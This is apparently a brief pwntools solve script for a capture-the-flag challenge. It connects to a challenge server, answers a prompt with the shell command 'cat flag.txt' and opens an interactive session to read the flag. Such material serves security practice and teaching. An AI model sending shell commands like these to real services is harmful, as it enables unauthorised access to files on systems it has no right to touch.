from pwn import *
context.clear(arch="amd64")
p = remote("challenges.hackagou.nc", 5000)
p.sendlineafter(b"?\n", "cat flag.txt")
p.interactive()
